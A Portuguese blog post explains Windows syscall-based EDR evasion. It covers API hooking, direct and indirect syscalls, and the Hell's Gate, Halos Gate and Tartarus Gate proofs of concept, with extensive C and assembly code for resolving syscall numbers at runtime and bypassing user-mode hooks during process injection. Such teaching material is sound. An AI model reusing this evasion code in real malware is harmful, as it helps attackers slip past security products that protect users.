---
layout: post
title: Syscalls Hell's
date: 2026-07-05
description: evasion with syscalls
categories: windows redteam malware
tags: windows redteam malware
---

* content
{:toc}







# Defense Evasion com Syscalls

O uso de ```syscalls``` para evasão hoje em dia é bem comum e já consolidado na area de segurança tanto com os threat actors quanto com os red teamers. Essa tecnica, assim como varias outras, abusam de funcionalidade padrão do s.o para contornar defesas em tempo de execução (runtime).

Nesse artigo vamos ver como essa tecnica funciona e algumas variações das POC's encontradas por ai. Antes de tudo para entender como a tecnica funciona precisamos saber o porque ela foi criada e qual proteção ela bypassa.


## Legit Syscall

Quando um programa precisa usar uma função ela é chamada a partir de uma dll, por exemplo a função ```OpenProcess``` necessita da dll ```kernel32.dll```, então a dll é carregada na memória, a função é chamada a partir da dll e depois é executada de fato (grosseiramente falando). 

O ponto aqui é que toda essa execução acontece em ```User-Mode``` que é uma camada de abstração usada por qualquer s.o para dividir a execução "high-level"(user-mode) e "low-level"(kernel-mode). Essa divisão ocorre para separar funcionalidades criticas que podem afetar o sistema, principalmente com funções que interagem com arquivos, memória, sockets de rede e etc.

No fluxo de execução de uma função no windows, primeiro o programa chama a função high-level, depois a execução é passada para a função low-level que faz as interações com o ```Kernel-Mode``` e por fim devolve o resultado das operações. No exemplo da ```OpenProcess``` a exeução é passada para a ```NtOpenProcess``` e a partir dela são feitas as operações de Kernel-Mode, como podemos ver no disassembly abaixo:


![opnprocsysc](/img/opnprocsysc.png)


Depois de processar os parâmetros passados, lá no final vemos uma instrução ```call``` para ```NtOpenProcess``` que passa a execução pra ela, em seguida vemos que o valor 0x26 é movido para EAX e por ultimo temos a instrução ```syscall```. É nessa parte que a syscall é chama de fato passando a execução para o Kernel-Mode.

O que acontece nesse ultimo pedaço é o seguinte: 

- O número 0x26 movido para EAX representa o número da syscall (0x26 representa NtOpenProcess) e cada syscall tem seu próprio número que estão presentes na ```System Service Descriptor Table (SSDT)``` uma tabela usada para armazena esses números que correspondem a ponteiros para funções no kernel.

- Quando a instrução syscall é executada o kernel usa o valor de EAX para procurar a syscall na tabela SSDT e executar a função correspondente dando inicio a rotina em Kernel-Mode.


Até aqui vimos um resumo de como uma syscall legitima é executada, isso foi para contextualizar o que vem a seguir.


## API hooking

Agora que sabemos como uma função é executada e o que é uma syscall, vamos entender como os produtos de segurança (AV/EDR) usam isso para barrar programas maliciosos.

Uma tecnica usada pelos AVs/EDRs é chamada de ```API hooking``` que consiste em basicamente desviar a execução de uma função para um "lugar" onde é possivel analisar, modificar ou barrar essa função. A forma mais conhecida é a ```Inline hooking``` que faz "hijack execution flow".

No Windows isso é possivel atravez da [Detours Library](https://github.com/microsoft/detours) que permite manipular a execução de funções injetando codigo customizado...  Para a analise de chamadas de função é adicionado uma instrução de  ```unconditional jump (JMP)``` que redireciona para uma função escrita pelo próprio vendor de AV/EDR.

Por de baixo dos panos esse processo funciona sobrescrevendo algumas intruções assembly inicias com o ```JMP``` que leva a execução para a função ```Detour```, função responsavel por analisar a função alvo. No meio disso uma função ```Trampolim``` é criada para preservar as instruções originais e retornar a execução da função que foi "hookada". Quando a função alvo termina a execução, a função Detour ja fez as ações necessarias (pré-definidas por quem escreveu a Detour) e retorna a execução ao fluxo original que geralmente é a ronita do Kernel-Mode.


![apihooking1](/img/apihooking1.png)


Resumindo, API hooking faz proxy da execução do função alvo, coleta informações sobre como ela foi invocada, e dependendo do que é analisado a execução é retomada ou não.

Essa é a solução que muitos AVs/EDRs usam para analise dinamica, eles fazem isso injectando suas próprias dlls nos processos spawnados pelo usuario inspecionando todas as funções marcadas como suspeitas.


## Direct e Indirect Syscalls


Esses dois tópicos foram uma introdução para explicar o basico do assunto central aqui que é o uso de syscalls em código malicioso. O principal motivo de usar syscalls em malware é para bypass de api hooking feitos por varias soluções de segurança.

A ideai é simples, os hooks de api são feitos em User-Mode antes que o fluxo passe para a execução das funções que interagem com Kernel-Mode, então a solução seria executar direto as syscalls presentes no dll ```ntdll.dll``` "driblando" o fluxo padrão e indo direto para a função original que não foi hookada.

Existem tecnicas e POCs diferentes que fazem isso e o objetivo aqui é mostrar as mais conhecidas. Vamos começar com as ```Direct``` e ```Indirect``` syscalls manuais.

A tecnica de ```Direct syscall```  consiste em literalmente fazer as syscalls manualmente, por isso "direct". 

Num projeto do Visual Studio:

1) incluir um arquivo ```.asm``` com o mesmo assembly usado pela ntdll.dll para chamar as syscall (com o numero SSN correto) .

```asm
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 0018h
    syscall
    ret
NtAllocateVirtualMemory END
```

2) incluir a definição/assinatura da função desejada com a tipagem e parametros necessarios para poder invoca-la (geralmente fica num arquivo de header ```.h``` ou no arquivo .c principal), porque a definição das funções presentes na ntdll não estão em nenhum header disponivel pelo microsoft.

```c
EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    ULONG ZeroBits,
    PULONG RegionSize,
    ULONG AllocationType,
    ULONG Protect
);
```

3) por fim num arquivo ```.c``` conterá o código que chama a função

```c
NtAllocateVirtualMemory(
    GetCurrentProcess(),
	&lpAllocationStart,
    0,
    (PULONG)0x1000,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE);
```

A diferença para a ```Indirect syscall``` é pequena, na definição do assembly ao invez de seguir as instruções padrão com ```mov eax, NUMBER``` e depois ```syscall``` para chamar "direct", é usado um ```jmp QWORD PTR [Nt*]``` para a função desejada. Dessa forma é possivel usar qualquer numero de syscall e pular para outra diferente, por isso "indirect".

#### Manual syscall problem

As tecnicas manuais de "direct" e "indirect" funcionam até certo ponto, o grande problema delas é a compatibilidade de versão, a cada versão ou build diferente do windows os numeros de syscall mudam fazendo ficar muito trabalhoso adaptar a deixar funcional para diferentes maquinas. Existem algums projetos que catalogaram as syscalls em diferentes versões mas mesmo assim não é algo pratico de usar. E fora o detalhe que manter os numeros das syscalls hardcoded não é uma boa pratica.

Desse problema surgiu a Poc ```Hells Gate``` que tem como a principal funcionalidade a resolução dos numeros das syscalls em runtime, removendo o obstaculo dos numeros fixos no código.



## Syscall Hells

A partir daqui vamos entrar na parte mais importante, a POC Hells Gate e suas variações, todas elas tem quase a mesma base de código mas cada uma resolve um problema diferente que foram surgindo após o aperfeiçoamento da tecnica.

### Hells Gate

- [https://github.com/am0nsec/HellsGate](https://github.com/am0nsec/HellsGate/) (Original Implementation)


Hells Gate é a primeira Poc publica que resolve os SSNs das syscalls dinamicamente. O core dessa tecnica se aproveita de que todo processo em User-Mode (ring 3) é linkado a dll ```ntdll``` que é responsavel pelas syscalls ou aka "api forwards" de User-Mode para Kernel-Mode.

Segundo o paper publicado pelos criadores da poc: "as funções dentro do módulo NTDLL.dll atuam como "wrappers" para syscalls e é justamente isso que pretendemos resolver programaticamente em runtime, sem depender de definições codificadas estaticamente hardcoded"

Na implementação dessa tecnica para que seja possivel extrair as informação necessarias da ntdll em meória foi feito o famoso "PE parse" a partir do ```PEB``` que ja vimos a alguns artigos atrás. A partir do PEB é possivel analisar a memória do processo atual e chegar na dll ntdll.


#### Hells Gate Steps

1) No começo da main primerio recupera os ponteiros para ```TIB``` que da acesso ao ```PEB``` atravez da função ```RtlGetThreadEnvironmentBlock()```

```c
INT wmain() {
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return 0x1;
```

2) Recupera o endereço da NTDLL atravez do campo ```PPEB_LDR_DATA LoaderData``` que permite enumerar dlls carregadas na memória do processo, e depois ter acesso a Export Table da NTDLL com a função ```GetImageExportDirectory()```, essa função faz o parse dos PE headers até a EAT da NTDLL e armazena um ponteiro pra ela em ```pImageExportDirectory``` (no código tem comentários então fica mais explcativo).


```c
// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;
```

```c
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}
```

3) Depois de ter o ponteiro para a EAT do NTDLL começa preencher a tabela ```VX_TABLE Table```. Essa tabela é resonsavel por armazenar e "estruturar" os dados de cada syscall recuperada da NTDLL. A tabela principal ```_VX_TABLE``` armazena todas as "entry" que são os endereços e nomes das funções. E essas infos são armazenadas individualmente na tabela ```_VX_TABLE_ENTRY```. A função responsavel por isso é a ```GetVxTableEntry()``` que recebe o enredeço base da dll, o endereço da EAT, o nome da função desejada em formato hash djb2 e percorre a EAT para encontrar as funções desejadas.

```c
VX_TABLE Table = { 0 };
	Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
		return 0x1;

...

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);
```

4) A função ```GetVxTableEntry()``` recupera os endereços das funções da memória: 

1 - iterando pelos nomes e comparando com os hashs das funções passadas para cada ```_VX_TABLE_ENTRY``` presentes na main. Se o hash for igual então a função foi encontrada e seu endereço é salvo.

```c
for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;
```

2 - com o endereço da função é feito uma coisa chamada ```pseudo-disassembly``` pelos autores, que analisa os primeiros bytes e compara com os opcodes assembly da syscall padrão (syscall stub).

```c
	// First opcodes should be :
	//    MOV R10, RCX
	//    MOV RCX, <syscall>
	if (*((PBYTE)pFunctionAddress + cw) == 0x4c
		&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
		&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
		&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
		&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
		&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
		BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
		BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
		pVxTableEntry->wSystemCall = (high << 8) | low;
		break;
	}
```

3 - se os bytes corresponderem com os opcodes da syscall o ```SSN``` (4 byte em diante) é salvo no campo da tabela de entry ```pVxTableEntry->wSystemCall``` e o loop continua.

```c
    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
	BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
	pVxTableEntry->wSystemCall = (high << 8) | low;
```


5) Por fim depois de percorrer a memória e salvar as funções necessarias, a função ```Payload()``` que recebe a tabela com os dados das funções. Ela é responsavel por executar as syscalls de fato usando as funções do assembly ```HellsGate()``` e ```HellDescent()```. 

Primeiro essas função são exportadas do assembly, depois usa elas passando o numero da syscall para ```HellsGate()``` e executando a syscall com ```HellDescent()``` que chama as instruções que compõem a chamada da forma correta. Fazendo isso com todas as funções para executar os steps de um process injection padrão

```c
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

...

	HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

...


.data
	wSystemCall DWORD 000h

.code 
	HellsGate PROC
		mov wSystemCall, 000h
		mov wSystemCall, ecx
		ret
	HellsGate ENDP

	HellDescent PROC
		mov r10, rcx
		mov eax, wSystemCall

		syscall
		ret
	HellDescent ENDP
end
```

- Exemplo da resolução de syscall no debugger. Repare no registrador EAX na direita em cima e que recebe o SSN ja resolvido.


![syscall18](/img/syscall18.png)


- Exec calc.exe


![hgexecgif](/img/hgexec.gif)


Até aqui considere esse código como base para as outras POCs que veremos aqui. Daqui em diante vou explicar apenas as partes que foram alteradas nas outras POCs para não deixam o artigo muito longo.


### Halos Gate


A versão ```Halos Gate``` resolve o problema de que, ao percorrer EAT da NTDLL, em algum momento pode ocorrer de alguma syscall não ser encontrada, talvez por ja estar hookada segundo o autor. O que o autor fez pra resolver isso foi "reconstruir" um pedaço que foi alterado: "basta olhar para os números dos vizinhos e ajustar de acordo. Se os vizinhos também estiverem hookados, verifique os vizinhos de seus vizinhos e assim por diante"

A alteração que feita no código foi na função ```GetVxTableEntry()``` responsavel por encontrar os syscalls na memória:

A lógica é simples, ao percorrer a EAT, se um ```jmp``` opcode ```e9``` for encontrado (o que significa um hook) o loop pula ```32 bytes``` (que é o tamanho exato de bytes que compõem o assembly de chamada de syscall em arch x64) para BAIXO (DOWN) ou para CIMA (UP) até encontrar uma syscalls valida e não hookada.

```c
#define UP -32
#define DOWN 32

...


if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
	pVxTableEntry->pAddress = pFunctionAddress;
	// First opcodes should be :
	//    MOV R10, RCX
	//    MOV RAX, <syscall>
	if (*((PBYTE)pFunctionAddress) == 0x4c
		&& *((PBYTE)pFunctionAddress + 1) == 0x8b
		&& *((PBYTE)pFunctionAddress + 2) == 0xd1
		&& *((PBYTE)pFunctionAddress + 3) == 0xb8
		&& *((PBYTE)pFunctionAddress + 6) == 0x00
		&& *((PBYTE)pFunctionAddress + 7) == 0x00) {
	
		BYTE high = *((PBYTE)pFunctionAddress + 5);
		BYTE low = *((PBYTE)pFunctionAddress + 4);
		pVxTableEntry->wSystemCall = (high << 8) | low;
		
		return TRUE;
	}
	// if hooked check the neighborhood to find clean syscall
	if (*((PBYTE)pFunctionAddress) == 0xe9) {
		for (WORD idx = 1; idx <= 500; idx++) {
			// check neighboring syscall down
			if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
				&& *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
				&& *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
				&& *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
				&& *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
				&& *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
				BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
				BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
				pVxTableEntry->wSystemCall = (high << 8) | low - idx;
				
				return TRUE;
			}
			// check neighboring syscall up
			if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
				&& *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
				&& *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
				&& *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
				&& *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
				&& *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
				BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
				BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
				pVxTableEntry->wSystemCall = (high << 8) | low + idx;
				
				return TRUE;
			}
		}
		
		return FALSE;
	}
}

```

Então como adivinhar o numero da syscall que foi hookada se não está lá? A reposta pra isso é simples também. Os numeros das syscall seguem uma sequencia linear, ou seja, crescente e decrescente. Por exemplo, se uma syscall for a 27, a proxima estiver hookada, e a seguinte for 29, então a syscall hookada é a 28.

No código funciona assim: conforme o loop pular 32 bytes um valor de index é somado ou subtraido, quando uma syscall valida for encontrada, o numero da syscall é somado ou subtraido pelo numero do index (referente a quantas syscall a frente ou atras o loop pulou). Como é uma sequencia linear a syscall hookada é "adivinhada" pela matematica.

```c
pVxTableEntry->wSystemCall = (high << 8) | low - idx;
```

- [https://blog.sektor7.net/#!res/2021/halosgate.md](https://blog.sektor7.net/#!res/2021/halosgate.md)


### Tartarus Gate

Da Poc Halos Gate pra ```Tartarus Gate``` a mudança é que foi adicionado mais dois loops que verificam três bytes a frente depois do inicio de cada função. Essa verificação é feita porque em aguns casos o hook não é feito logo no inicio das funções, então os 3 primeiros bytes (```4c 8b d1 | mov r10, rcx```) ainda são os mesmos de uma syscall padrão, isso enganaria a validação feito pelo Halos Gate que procura um ```jmp``` logo no começo.

```c
if (*((PBYTE)pFunctionAddress + 3) == 0xe9) {
```

Outra coisa que o autor da Tartarus Gate fez foi adicionar algumas instruções ```nop``` no assembly que executa as syscalls. E também adicionou a função ```NtWriteVirtualMemory``` ao inves de usar a ```VxMoveMemory``` da Poc original.


- [https://github.com/trickster0/TartarusGate](https://github.com/trickster0/TartarusGate)


### Outras variantes

Alem das versões mais comuns que mantem a base de cógido original mudando pouca coisa, temos outras variantes em linguagens diferentes como C#, Rust, Golang e até Nim. Também existem algumas que se baseiam na tecnica de syscall mas ao invez de fazer "direct syscall", essas variantes modificaram o código para usar as "indirect syscall". Estou mencionando essas variantes pra deixar registrado aqui a quem for util saber, mas o foco desse artigo eram as POCs mais conhecidas, a ideia aqui era fornecer o entendimento base do código caso o leitor queira ir mais adiante.


#### Referências

- [https://github.com/geleiaa/SyscallsHells](https://github.com/geleiaa/SyscallsHells) (Repositorio com as pocs citadas aqui)

- [https://github.com/Maldev-Academy/HellHall](https://github.com/Maldev-Academy/HellHall) (HellHall - indirect syscalls)
- [https://github.com/thefLink/RecycledGate](https://github.com/thefLink/RecycledGate) (Recycled Gate - avoid the usage of direct syscalls)
- [https://github.com/am0nsec/SharpHellsGate](https://github.com/am0nsec/SharpHellsGate) (C# hells gate)